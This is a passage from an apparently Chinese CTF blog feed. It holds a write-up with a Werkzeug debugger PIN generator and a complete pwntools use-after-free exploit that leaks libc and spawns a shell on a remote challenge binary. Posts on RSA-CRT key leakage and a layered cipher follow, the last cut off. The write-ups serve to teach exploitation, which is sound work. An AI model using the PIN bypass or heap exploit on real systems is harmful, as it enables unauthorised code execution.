username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python2.7/dist-packages/flask/app.pyc'</span> <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485377892354'</span><span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="keyword">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="keyword">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure></p><p>生成pin码，执行命令即可</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="暴力可解"><a href="#暴力可解" class="headerlink" title="暴力可解"></a>暴力可解</h3><p>很无聊的misc<br>题目暗示暴力可解，爆破压缩包密码即可<br>解开拿到两个图片，用stegsolve合并发现不行<br>于是很容易想到盲水印，然后就拿到flag了<br>都是ctf出烂的套路</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="爬坡道（提交你找到的字符串的md5值）"><a href="#爬坡道（提交你找到的字符串的md5值）" class="headerlink" title="爬坡道（提交你找到的字符串的md5值）"></a>爬坡道（提交你找到的字符串的md5值）</h3><p>很无聊的密码题，题目名暗示hill加密<br>拿到密文图片binwalk一下，发现key.png<br>在线解密即可</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Unote2"><a href="#Unote2" class="headerlink" title="Unote2"></a>Unote2</h3><p>漏洞点在deleteNote，free掉以后没有清空指针，造成uaf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*((void **)ptr[v1] + 1));</span><br><span class="line">    free(ptr[v1]);</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>addNote申请一个0x8 byte结构体，用于存放函数指针以及content，函数指针指向该处<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_804865B(char *s)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v1; // eax</span><br><span class="line"></span><br><span class="line">  v1 = strlen(s);</span><br><span class="line">  printf(&quot;length :%zu\ncontent :&quot;, v1);</span><br><span class="line">  return puts(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>申请3个note，这样malloc了6个chunk，分别是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;A&apos; 0x10 byte + size+0x10 byte</span><br><span class="line">&apos;B&apos; 0x10 byte + size+0x10 byte</span><br><span class="line">&apos;C&apos; 0x10 byte + size+0x10 byte</span><br></pre></td></tr></table></figure></p><p>free掉两个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head --&gt;  &apos;A&apos; 0x10  --&gt;  &apos;B&apos; 0x10</span><br></pre></td></tr></table></figure></p><p>再申请一个note，这时就把free掉的chunk重新分配回来了，合适地构造leak出libc_base。<br>最后伪造一个fake node，当show这个node的时候就调用了system。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">s = process(<span class="string">'./note'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./note'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/root/toolchain/expmake/libc_x86'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">s = remote(<span class="string">'101.71.29.5'</span>, <span class="number">10010</span>)</span><br><span class="line">elf = ELF(<span class="string">'./note'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/root/toolchain/expmake/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">gdb.attach(cn,a)</span><br><span class="line"><span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,con)</span>:</span></span><br><span class="line">s.sendline(<span class="string">'1'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Note size :'</span>)</span><br><span class="line">s.send(str(size))</span><br><span class="line">s.recvuntil(<span class="string">'Content :'</span>)</span><br><span class="line">s.send(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">s.sendline(<span class="string">'2'</span>)</span><br><span class="line">s.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">s.send(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">s.send(<span class="string">'3'</span>)</span><br><span class="line">s.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">s.send(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'A'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'B'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'C'</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#z('b*0x08048691\nc')</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,p32(<span class="number">0x804865B</span>)+p32(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">s.recvuntil(<span class="string">"content :"</span>)</span><br><span class="line">leak = s.recv(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u32(leak) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">log.info(<span class="string">"libc_base:0x%x"</span>%libc.address)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,p32(libc.symbols[<span class="string">'system'</span>])+p32(libc.search(<span class="string">'/bin/sh'</span>).next()))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><p>定义了 3 个函数指针，第一个是交换两个数位置，第二个返回<code>abs(x + y) - abs(x) - abs(y) + 2</code>，第三个返回<code>abs(x) + abs(y) - abs(x + y) + 2</code>，然后 <code>strcmp</code> 比较前 5 个字符是否是<code>flag{</code>，之后列了几个条件。</p><ul><li>a1[7] + a1[6] == a1[8]</li><li>a1[10] + a1[9] == a1[11]</li><li>a1[13] + a1[12] == a1[14]</li><li>a1[16] + a1[15] == a1[17]</li><li>a1[19] + a1[18] == a1[20]</li><li>a1[8] ^ a1[11] ^ a1[14] ^ a1[17] ^ a1[21] == a1[5]<br>没法直接解上面的方程，继续往下看，通过一个函数来 <code>output</code>一个值。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">6</span>; i &lt;= <span class="number">19</span>; i += <span class="number">3</span> )</span><br><span class="line">    res = <span class="number">100</span> * res + <span class="number">10</span> * (*((<span class="keyword">char</span> *)<span class="built_in">cin</span> + i) - <span class="number">48</span>) + *((<span class="keyword">char</span> *)<span class="built_in">cin</span> + i + <span class="number">1</span>) - <span class="number">48</span>;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br></pre></td></tr></table></figure></li></ul><p>可以看到 100 和 10 等， 很明显是 10 进制左移 2 位，左移 1 位和不左移。<br>再往下是依次调用三个函数，实现 <code>exchange</code>a[4]和 a[5]，然后调用第二个，不影响。最后调用第三个，要使其返回 0 才能 getflag。<br><code>|x|+|y|&gt;=|x+y|，所以|x|+|y|-|x+y|+2&gt;=2无解，但右边等于0x100000000能有解，即结果溢出了，所以可以使|x|==|y|==0x7fffffff</code><br>这样就求得了两个值，即 0x7fffffff和0x80000001，然后根据 <code>getvalue</code> 函数的返回值确定是正数，得到 a[5]是 0x7fffffff，即 2147483647‬。然后我们反求 flag 即可。<br>所以 flag 的 6，7 位是 21；9，10 位是47；12，13 位是48；15，16 位是36；18，19 位是47。再根据上面的方程解出第 8，11，14，17，20 位是 cklik，最后还有第 5，21 位。猜测 flag 长度就是 22，这样 21 位是}，然后得到第五位是 p。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>题目挺容易的，这次主要突出一个流量分析吧~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;流量分析&quot;&gt;&lt;a href=&quot;#流量分析&quot; class=&quot;headerlink&quot; title=&quot;流量分析&quot;&gt;&lt;/a&gt;流量分析&lt;/h2&gt;&lt;p&gt;这次流量分析不算难，可以轻易做出来&lt;br&gt;这里的记录就不仔细分析了，我还是耍了一些小聪明的&lt;br&gt;想学习的可以看我之前的文章
      
    
    </summary>
    
      <category term="writeup" scheme="http://skysec.top/categories/writeup/"/>
    
    
      <category term="writeup" scheme="http://skysec.top/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>RSA之拒绝套路(2)</title>
    <link href="http://skysec.top/2018/08/25/RSA%E4%B9%8B%E6%8B%92%E7%BB%9D%E5%A5%97%E8%B7%AF-2/"/>
    <id>http://skysec.top/2018/08/25/RSA之拒绝套路-2/</id>
    <published>2018-08-25T09:35:44.000Z</published>
    <updated>2018-10-06T03:28:41.697Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发在合天智汇</span><br></pre></td></tr></table></figure></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>话不多说，接着前一期，继续探讨RSA的相关问题，上一期，我们讨论了，如果泄露了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(n,e,dp,c)</span><br></pre></td></tr></table></figure></p><p>可以导致密文被解密的危害。<br>这一次，我们探讨如果泄露<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(dp,dq,q,p,c)</span><br></pre></td></tr></table></figure></p><p>会带来什么严重影响？</p><h2 id="题干"><a href="#题干" class="headerlink" title="题干"></a>题干</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dp= 90494486973243104756298311175705002887155440121025946664275790548694955799661434870163629541771658812502682012435200659355928618529521731475360236486362525996535354732687624609637012830178545914960485330748345108757203508531117591067570383564779625954776907685968592668868046507450242047759226407026094726359</span><br><span class="line">dq= 92386717102324384872139253931247976320472847834037799716676564640678692924258053130751618730959510913784801723023536527134208843358920592320351399005428347188639433875570867152865970587272904695272790831679276818402117343413503376057524788386479263579869430615501089905630519162146030369086836183772975252551</span><br><span class="line">p= 121869669684596731118740111360803257498670698122183387353481580136405322481841982461820301261370579505460038281590785837096967719889404913176714663774999789266522508163678949469953184327222227297952119212490499582581953510522212981687122483764873187827531047946130999532741388680549345732675732040579796067001</span><br><span class="line">q= 128363031923139297392077349407719417788135630403499671848196425800900870531452570499668481104884553795224784931947824885511134525485570129640119439950191944938407656926280993408854767711557863016197167505998324659906146937423415404059310560359693643987781862684489401368519777953281060013045590132161625607377</span><br><span class="line">c= 4176193749773450562408160796325873473193702511560805285554329767573726211097194419198463203488792792756598428753745425419950423161673497255820731183746106463781291156892140581651301528184812357534808298071893380519977926677138246941946185699346532140641376461516107672722425971178865758049759985915001009787241295292157744353554548314911531918044654676691927347018033509499136103964942830581407087547565204232556314726045307279963709599952745342811947421707024572981812906869557834491207590418553244020621858083633564878305733114484857827620268881100166090837841224767358579366482347136224695333980041913268394994302</span><br></pre></td></tr></table></figure><p>题目很清晰，我们没有公钥和私钥，却要从密文推出明文，我们下面来尝试公式推导</p><h2 id="公式推导之万事俱备"><a href="#公式推导之万事俱备" class="headerlink" title="公式推导之万事俱备"></a>公式推导之万事俱备</h2><p>还是先摆出已知条件</p><script type="math/tex; mode=display">c \equiv m^{e} \text{ } mod \text{ } n \\m \equiv c^{d} \text{ } mod \text{ } n \\\phi (n) = (p-1)*(q-1) \\d*e \equiv 1 \text{ } mod \text{ } \phi (n) \\dp \equiv d \text{ } mod \text{ } (p-1) \\dq \equiv d \text{ } mod \text{ } (q-1)</script><p>我们的目标很简单，如何从这些式子得到答案</p><script type="math/tex; mode=display">c^{d}</script><p>首先根据</p><script type="math/tex; mode=display">m \equiv c^{d} \text{ } mod \text{ } n</script><p>因为</p><script type="math/tex; mode=display">gcd(p,q)=1 \\n=p*q</script><p>利用中国剩余定理,我们可以得到</p><script type="math/tex; mode=display">\begin{cases}m_1 \equiv c^{d} \text{ } mod \text{ } p \\m_2 \equiv c^{d} \text{ } mod \text{ } q \\\end{cases}</script><p>这里肯定有很多人不理解，我简单证明一下</p><script type="math/tex; mode=display">m \equiv c^{d} \text{ } mod \text{ } n</script><p>可以得到式子</p><script type="math/tex; mode=display">m = c^{d}+k*n</script><p>因为</p><script type="math/tex; mode=display">n = p*q</script><p>所以可以得到</p><script type="math/tex; mode=display">m = c^{d}+p*q*k</script><p>上述式子，同时取余q和p，可以分别得到</p><script type="math/tex; mode=display">m_1 \equiv c^{d} \text{ } mod \text{ } q \\m_2 \equiv c^{d} \text{ } mod \text{ } p</script><p>为什么<code>kpq</code>没了,因为这是p或者q的倍数呀~<br>然后我们继续<br>由式1可以得到</p><script type="math/tex; mode=display">c^{d}=kp+m1</script><p>我们把这个带入式2<br>可以得到</p><script type="math/tex; mode=display">m_2 \equiv (kp+m1) \text{ } mod \text{ } q</script><p>等式两边同时减去m1,可以得到</p><script type="math/tex; mode=display">(m2-m1) \equiv kp \text{ } mod \text{ } q</script><p>这里因为</p><script type="math/tex; mode=display">gcd(p,q)=1</script><p>所以可以求p的逆元，得到</p><script type="math/tex; mode=display">(m2-m1)*p^{-1} \equiv k \text{ } mod \text{ } q</script><p>所以这里得到如下两个式子</p><script type="math/tex; mode=display">k \equiv (m2-m1)*p^{-1} \text{ } mod \text{ } q \\c^{d}=kp+m1 \\m \equiv c^{d} \text{ } mod \text{ } n</script><p>我们上下两个式子合并，得到</p><script type="math/tex; mode=display">c^{d}=((m2-m1)*p^{-1} \text{ } mod \text{ } q)p+m1 \\m \equiv c^{d} \text{ } mod \text{ } n</script><p>最后可以有</p><script type="math/tex; mode=display">m \equiv (((m2-m1)*p^{-1} \text{ } mod \text{ } q)p+m1) \text{ } mod \text{ } n</script><h2 id="公式推导之只欠东风"><a href="#公式推导之只欠东风" class="headerlink" title="公式推导之只欠东风"></a>公式推导之只欠东风</h2><p>现在只剩最后一步了，即</p><script type="math/tex; mode=display">m_1 \equiv c^{d} \text{ } mod \text{ } q \\m_2 \equiv c^{d} \text{ } mod \text{ } p</script><p>这里的m1和m2怎么求？<br>这时候我们有</p><script type="math/tex; mode=display">\begin{cases}d \equiv dp \text{ } mod \text{ } (p-1) \\d \equiv dq \text{ } mod \text{ } (q-1)\end{cases}</script><p>那么分别带入，有</p><script type="math/tex; mode=display">\begin{cases}m_1 \equiv c^{dq \text{ } mod \text{ } (q-1)} \text{ } mod \text{ } q \\m_2 \equiv c^{dp \text{ } mod \text{ } (p-1)} \text{ } mod \text{ } p\end{cases}</script><p>这里肯定有人又不理解为什么可以直接带入了，我们再证明一下，这里用到了费马小定理<br>即假如p是质数，且<code>gcd(a,p)=1</code>，</p><script type="math/tex; mode=display"> a^{(p-1)}  \equiv 1 \text{ } mod \text{ } p \\</script><p>所以如果我们有等式</p><script type="math/tex; mode=display">d = dp+k*(p-1)</script><p>我们直接带入，有</p><script type="math/tex; mode=display">m_2 \equiv c^{dp+k*(p-1)} \text{ } mod \text{ } p</script><p>这里的指数，我们拆开，为</p><script type="math/tex; mode=display">m_2 \equiv c^{dp}*c^{k*(p-1)} \text{ } mod \text{ } p</script><p>这里的</p><script type="math/tex; mode=display">c^{k*(p-1)}  \equiv 1 \text{ } mod \text{ } p</script><p>注：因为p是大素数，显然和c互素<br>所以可以直接得到</p><script type="math/tex; mode=display">m_2 \equiv c^{dp} \text{ } mod \text{ } p</script><p>那么m1根据对称性也可以同理得到</p><script type="math/tex; mode=display">m_1 \equiv c^{dq} \text{ } mod \text{ } q</script><p>故此，我们现在拥有了所有条件，下面归纳一下为</p><script type="math/tex; mode=display">\begin{cases}m_1 \equiv c^{dq} \text{ } mod \text{ } q \\m_2 \equiv c^{dp} \text{ } mod \text{ } p \\m \equiv (((m2-m1)*p^{-1} \text{ } mod \text{ } q)p+m1) \text{ } mod \text{ } n \end{cases}</script><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>万事俱备，那我们开始写脚本吧~<br>脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(dp,dq,p,q,c)</span>:</span></span><br><span class="line">    InvQ = gmpy2.invert(q, p)</span><br><span class="line">    mp = pow(c, dp, p)</span><br><span class="line">    mq = pow(c, dq, q)</span><br><span class="line">    m = (((mp-mq)*InvQ) % p)*q+mq</span><br><span class="line">    <span class="keyword">print</span> libnum.n2s(m)</span><br><span class="line"></span><br><span class="line">dp= <span class="number">24417628139330679432551095868116968814142396193102639509841676574931690513464588523684381397207121003439385360929299071710433231196678202942915347185802024747158497456267595000613289619481116892073493417896024118597833611923086327107489774162727006791982668721110819684552525393969199138125692085053266311867</span></span><br><span class="line">dq= <span class="number">39019112110614280252241495036646034807151213716557526376274345944263453299622818575225245299195523420254672088668617876062998490653404750105272510633841394184860866942704080992475543547501372565259180366123356119418623253283732615682878021900318153700726522250094020806743598752556541454865233668070931534349</span></span><br><span class="line">p= <span class="number">114461439704891616590422134857421869878753559940962522699708885701308630438427731936479777010552391068812199529467348873013239528376604282404207321401876195560830474695517139918118078685078197948576662138382523308600480733574419071424466292785993331731881271557573094521160051353184489095799816579282742140953</span></span><br><span class="line">q= <span class="number">173407999660109485520889209734134041910836523881475540116955713891631837403964097088089751678165465931150331234455699896350201315926126639981461748491240790317968076899655657331112140939100897570439934688992874242416328330344836429844042122956843979375681077968897817612357468397424082494911472122421034561779</span></span><br><span class="line">c= <span class="number">13156088528156801357013836665002509320288819562687150049688430847488062217199478847649128772442129783962344653461951822569890099822350753026372449754819799394899656016487248023042927376134885257136511477879900672582593964626335310995748816166750941755394630154620318544805488209700324391789948495807096701620546557726907853315159542234979480907794659188799145765761654813882682456135251746607111274015475601810166327843158879230660349983897375641623569327757258851636029354634714133778666281729500815659100876558161468140039778498553902396380237570072543395294246750182054410091138654202418836971487515663618000662737</span></span><br><span class="line">decrypt(dp,dq,p,q,c)</span><br></pre></td></tr></table></figure></p><p>最后我们愉快的得到了flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dp_dq_is_very_dangerous!_47325684736584&#125;</span><br></pre></td></tr></table></figure></p><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>这一题告诉我们，如果dp,dq,p,q泄露，就算e,d都保密，也可以被解密<br>而这种方法也存在于实际中，是用于RSA的加快解密的，专业称为RSA_CRT leaks<br>今天推导一遍，感觉又复习了不少东西XD</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;figure class=&quot;highligh
      
    
    </summary>
    
      <category term="crypto" scheme="http://skysec.top/categories/crypto/"/>
    
    
      <category term="rsa" scheme="http://skysec.top/tags/rsa/"/>
    
      <category term="crypto" scheme="http://skysec.top/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>Crypto之击破多层加密</title>
    <link href="http://skysec.top/2018/08/24/Crypto%E4%B9%8B%E5%87%BB%E7%A0%B4%E5%A4%9A%E5%B1%82%E5%8A%A0%E5%AF%86/"/>
    <id>http://skysec.top/2018/08/24/Crypto之击破多层加密/</id>
    <published>2018-08-24T12:02:13.000Z</published>
    <updated>2018-10-06T03:28:18.970Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于 https://xz.aliyun.com/t/2627</span><br></pre></td></tr></table></figure></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在看Crypto，记录一下一道题的过程</p><h2 id="题干分析"><a href="#题干分析" class="headerlink" title="题干分析"></a>题干分析</h2><p>题目名称叫多层，所以我们看到最后的加密形式为<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag = layer1(flag)</span><br><span class="line">flag = layer2(flag)</span><br><span class="line">flag = layer3(flag)</span><br><span class="line">flag = layer4(flag)</span><br><span class="line"></span><br><span class="line">print(flag.decode(<span class="string">'ascii'</span>))</span><br></pre></td></tr></table></figure></p><p>那么我们逐层分析</p><h2 id="layer1"><a href="#layer1" class="headerlink" title="layer1"></a>layer1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">layer1</span><span class="params">(data)</span>:</span></span><br><span class="line">    data = data.decode(<span class="string">'ascii'</span>)</span><br><span class="line">    s = string.ascii_uppercase</span><br><span class="line">    t = list(s)</span><br><span class="line">    random.shuffle(t)</span><br><span class="line">    t = <span class="string">''</span>.join(t)</span><br><span class="line">    print(collections.Counter(data))</span><br><span class="line">    <span class="keyword">return</span> data.translate(str.maketrans(s, t)).encode(<span class="string">'ascii'</span>)</span><br></pre></td></tr></table></figure><p>s的输出为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br></pre></td></tr></table></figure></p><p>t将s随机打乱重新排列<br>然后将题目将flag中出现的字频统计出来，打印出来，又将flag中的字母按s-t这个替换表替换<br>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s：ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">t： NVOJWAXCBQRSMZYUDKILEFTPHG</span><br></pre></td></tr></table></figure></p><p>按这个对应顺序替换（当然t是随机打乱的，这只是个例子）,最后再全部转换为ascii编码<br>我们看一下flag的字频统计：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Counter(&#123;&apos; &apos;: 14, &apos;O&apos;: 6, &apos;A&apos;: 5, &apos;U&apos;: 4, &apos;I&apos;: 4, &apos;T&apos;: 4, &apos;N&apos;: 3, &apos;D&apos;: 3, &apos;E&apos;: 3, &apos;L&apos;: 3, &apos;H&apos;: 3, &apos;Y&apos;: 3, &apos;R&apos;: 3, &apos;G&apos;: 2, &apos;C&apos;: 2, &apos;F&apos;: 2, &apos;W&apos;: 2, &apos;.&apos;: 1, &apos;&#125;&apos;: 1, &apos;B&apos;: 1, &apos;V&apos;: 1, &apos;Q&apos;: 1, &apos;P&apos;: 1, &apos;X&apos;: 1, &apos;M&apos;: 1, &apos;\n&apos;: 1, &apos;&#123;&apos;: 1, &apos;K&apos;: 1, &apos;J&apos;: 1, &apos;S&apos;: 1, &apos;Z&apos;: 1&#125;)</span><br></pre></td></tr></table></figure></p><h2 id="layer2"><a href="#layer2" class="headerlink" title="layer2"></a>layer2</h2><p>第二层很短<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">layer2</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(b * <span class="number">17</span> % <span class="number">251</span> <span class="keyword">for</span> b <span class="keyword">in</span> data)</span><br></pre></td></tr></table></figure></p><p>将layer1的结果乘17取余251，这也很好反求回来</p><script type="math/tex; mode=display">17*b \equiv c \text{ } mod \text{ } 251\\</script><p>问题即：我们已知c怎么求b<br>这里用逆元即可：</p><script type="math/tex; mode=display">b \equiv c*17^{-1} \text{ } mod \text{ } 